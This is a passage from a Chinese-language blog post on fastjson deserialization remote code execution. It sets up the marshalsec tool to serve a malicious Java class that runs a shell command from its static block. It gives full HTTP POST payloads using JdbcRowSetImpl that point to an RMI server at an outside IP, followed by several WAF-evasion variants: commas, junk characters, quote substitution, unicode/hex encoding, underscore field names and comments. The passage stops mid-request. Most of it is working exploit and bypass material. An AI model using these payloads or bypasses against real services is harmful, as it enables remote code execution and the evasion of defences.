title="总结："></a>总结：</h2><p>BasicDataSoure这条链，在<code>&lt;=1.2.24</code>版本才适用，在<code>1.2.25</code>版本后<code>org.apache.tomcat</code>包设置为了黑名单，不能进行反序列化了。</p><p>这条链的主要逻辑是调用java的<code>BECL</code>，其中的<code>ClassLoader</code>的<code>loadClass</code>是public的，并且<code>BasicDataSource</code>的<code>driverClassLoader</code>和<code>driverClassName</code>是可控的，因此才会出现rec。</p><p>在这条链中，需要注意tomcat的版本，但只有两个版本，因此都试一下，还有是服务端需要使用<code>parseObject</code>，而不是使用<code>parse</code>方法，如果使用<code>parse</code>方法，不会调用所有get方法，getConncetion方法也不会被调用，这条链就不能执行了。</p><h1 id="0x06-fastjson的一些小工具："><a href="#0x06-fastjson的一些小工具：" class="headerlink" title="0x06 fastjson的一些小工具："></a>0x06 fastjson的一些小工具：</h1><h2 id="marshalsec："><a href="#marshalsec：" class="headerlink" title="marshalsec："></a>marshalsec：</h2><h3 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载marshalsec：<br>git <span class="hljs-built_in">clone</span> https://github.com/mbechler/marshalsec.git<br>安装maven：<br>apt-get install maven<br></code></pre></td></tr></table></figure><p>修改配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/share/maven/conf<br>vim settings.xml<br></code></pre></td></tr></table></figure><p>在<code>mirrors</code>目录中添加阿里云的镜像：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在解压目录下编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests<br></code></pre></td></tr></table></figure><h3 id="编写class文件："><a href="#编写class文件：" class="headerlink" title="编写class文件："></a>编写class文件：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;touch /tmp/fastjson&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译成class文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac Calc.java<br></code></pre></td></tr></table></figure><p>然后启动一个http服务，在<code>Calc.class</code>目录下：</p><p><img src="/./../blog_image/image-20240408172353815.png" alt="image-20240408172353815"></p><p>运行marshalsec：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://[vps]/#Calc&quot;</span> 9999<br></code></pre></td></tr></table></figure><p>表示从vps服务器的80端口上下载<code>Calc</code>这个文件，并且开了的rmi端口为<code>9999</code>。</p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>159<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span></span><br><span class="language-json">    <span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>上雷池后会被拦截。</p><p><img src="/./../blog_image/image-20240408172721392.png" alt="image-20240408172721392"></p><h1 id="0x07-bypass-waf的小技巧："><a href="#0x07-bypass-waf的小技巧：" class="headerlink" title="0x07 bypass waf的小技巧："></a>0x07 bypass waf的小技巧：</h1><h2 id="1-json字段不适用双引号绕过："><a href="#1-json字段不适用双引号绕过：" class="headerlink" title="1. json字段不适用双引号绕过："></a>1. json字段不适用双引号绕过：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, dataSourceName:\&quot;rmi://localhost:1099/aa\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><p>还是得配合<code>,</code>进行绕过：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>178<br><br><span class="language-autohotkey">&#123;</span><br><span class="language-autohotkey">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-autohotkey"> ,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,      <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="language-autohotkey"><span class="hljs-title">        dataSourceName:</span><span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span>,</span><br><span class="language-autohotkey">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-autohotkey">    &#125;</span><br><span class="language-autohotkey">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2-使用-绕过："><a href="#2-使用-绕过：" class="headerlink" title="2. 使用,绕过："></a>2. 使用<code>,</code>绕过：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;,,,,,,,,,,,,\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,,,,,,,,,,,,,,,,,,,,,,,,,, dataSourceName:\&quot;rmi://localhost:1099/aa\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看<code>DefaultJSONParser</code>：</p><p><img src="/./../blog_image/image-20240408160021511.png" alt="image-20240408160021511"></p><p>原理是默认开启了<code>Feature.AllowArbitraryCommas</code>。</p><p>如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>193<br><br><span class="language-autohotkey">&#123;</span><br><span class="language-autohotkey">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-autohotkey"> ,,,,,,,,,,       <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,,,,,,,,,,,,,,,,,</span><br><span class="language-autohotkey">        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span>,,,,,,,,,</span><br><span class="language-autohotkey">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-autohotkey">    &#125;</span><br><span class="language-autohotkey">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="3-垃圾字符绕过："><a href="#3-垃圾字符绕过：" class="headerlink" title="3. 垃圾字符绕过："></a>3. 垃圾字符绕过：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\r\r\b&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,,,,,,,,,,,,,,,,,,,,,,,,,, dataSourceName:\&quot;rmi://localhost:1099/aa\&quot;, \b\r\&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>JSONLexerBase#skipWhitespace</code>方法：</p><p><img src="/./../blog_image/image-20240408160217652.png" alt="image-20240408160217652"></p><p>主要用于将<code>空格</code>，<code>\r</code>，<code>\n</code>，<code>\t</code>，<code>\f</code>，<code>\b</code>去除。</p><h2 id="4-type后的值第一个引号可以替换为其他字符："><a href="#4-type后的值第一个引号可以替换为其他字符：" class="headerlink" title="4. @type后的值第一个引号可以替换为其他字符："></a>4. @type后的值第一个引号可以替换为其他字符：</h2><p><img src="/./../blog_image/image-20240409092236511.png" alt="image-20240409092236511"></p><p>这里我们可以对比之前获取<code>@type</code>的过程，先检验了当前位置是<code>&quot;</code>再扫描到下一个<code>&quot;</code>之间的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;&quot;&#x27;</span>) &#123;<br>  key = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>  lexer.skipWhitespace();<br>  ch = lexer.getCurrent();<br><span class="hljs-comment">//省略不必要代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>因此可以证明是@type后的值第一个引号可以替换为其他字符，因此可以构造payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span>?com.sun.rowset.JdbcRowSetImpl<span class="hljs-string">&quot;,&quot;</span>dataSourceName<span class="hljs-string">&quot;:&quot;</span>rmi<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true</span><br></code></pre></td></tr></table></figure><p>并且第一个字符后面不用双引号。即左边不用双引号+随机一个字符，右边则需要双引号。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><br><span class="language-d">&#123;</span><br><span class="language-d">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-d">        <span class="hljs-string">&quot;@type&quot;</span>:xcom.sun.rowset.JdbcRowSetImpl<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-d">        dataSourceName:&quot;</span>rmi:<span class="hljs-comment">//121.37.229.215:9999/Calc&quot;,</span></span><br><span class="language-d">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-d">    &#125;</span><br><span class="language-d">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="5-unicode-hex编码绕过："><a href="#5-unicode-hex编码绕过：" class="headerlink" title="5. unicode&#x2F;hex编码绕过："></a>5. unicode&#x2F;hex编码绕过：</h2><p>在<code>JSONLexerBase#scanSymbol</code>方法中：</p><p>如果当前字符是<code>\u</code>或者是<code>\x</code>都会进行编码操作。</p><p><img src="/./../blog_image/image-20240409093048480.png" alt="image-20240409093048480"></p><p>单纯使用unicode编码在雷池中会被检测出：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>170<br><br><span class="language-wren">&#123;</span><br><span class="language-wren">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-wren"> <span class="hljs-string">&quot;<span class="hljs-char escape_">\u0040</span><span class="hljs-char escape_">\u0074</span><span class="hljs-char escape_">\u0079</span><span class="hljs-char escape_">\u0070</span><span class="hljs-char escape_">\u0065</span>&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="language-wren"> <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span>,</span><br><span class="language-wren">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-wren">    &#125;</span><br><span class="language-wren">&#125;</span><br></code></pre></td></tr></table></figure><p>尝试混合编码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>166<br><br><span class="language-wren">&#123;</span><br><span class="language-wren">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-wren"> <span class="hljs-string">&quot;<span class="hljs-char escape_">\u0040</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\u0079</span><span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\u0065</span>&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="language-wren"> <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span>,</span><br><span class="language-wren">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-wren">    &#125;</span><br><span class="language-wren">&#125;</span><br></code></pre></td></tr></table></figure><p>没有绕过，但这里也只是测试了雷池，或者可以尝试其他的waf看能不能绕过，通过hex&#x2F;unicode混合编码。</p><h2 id="6-对字段添加多个下划线或者减号："><a href="#6-对字段添加多个下划线或者减号：" class="headerlink" title="6. 对字段添加多个下划线或者减号："></a>6. 对字段添加多个下划线或者减号：</h2><p>1.2.36版本前，在在<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code></p><p>解析字段的key的时候，调用了<code>smartMatch</code>：</p><p><img src="/./../blog_image/image-20240409094620220.png" alt="image-20240409094620220"></p><p>由于存在break，因此<code>_</code>和<code>-</code>不能混合使用。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;d_a_t_aSourceName\&quot;:\&quot;rmi://localhost:1099/aa\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>在<code>1.2.36</code>版本之后，则可以混合使用：</p><p><img src="/./../blog_image/image-20240409094720551.png" alt="image-20240409094720551"></p><p>因此可以尝试使用<code>-</code>和<code>_</code>对字段进行混淆。</p><p>这里测试的是<code>1.2.24</code>版本，本地可以直接运行，但是不能绕过waf，还是得配合第四点进行绕过，或者添加逗号：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>167<br><br><span class="language-ruby">&#123;</span><br><span class="language-ruby">    <span class="hljs-string">&quot;b&quot;</span><span class="hljs-symbol">:/*shabi*/</span>&#123;</span><br><span class="language-ruby"> <span class="hljs-regexp">/*shabi*/</span><span class="hljs-string">&quot;@type&quot;</span><span class="hljs-symbol">:xcom</span>.sun.rowset.<span class="hljs-title class_">JdbcRowSetImpl</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-ruby"> &quot;</span>dat____aSourceName<span class="hljs-string">&quot;:&quot;</span><span class="hljs-symbol">rmi:</span>/<span class="hljs-regexp">/121.37.229.215:9999/</span><span class="hljs-title class_">Calc</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-ruby">        &quot;</span>autoCommit<span class="hljs-string">&quot;:true</span></span><br><span class="hljs-string"><span class="language-ruby">    &#125;</span></span><br><span class="hljs-string"><span class="language-ruby">&#125;</span></span><br></code></pre></td></tr></table></figure><h2 id="7-注释绕过："><a href="#7-注释绕过：" class="headerlink" title="7. 注释绕过："></a>7. 注释绕过：</h2><p>可以尝试在json字段前后添加注释进行绕过，但是这种方法还是不能直接过waf，还需要配合首字母或者逗号绕过：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">/**/</span><span class="hljs-punctuation">&#123;</span><span class="hljs-comment">/*&#123;*/</span><span class="hljs-comment">/*&#125;*/</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;d_a_t_aSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://localhost:1099/aa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>一些waf可能可以，这里配合任意首字母去绕过雷池：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span 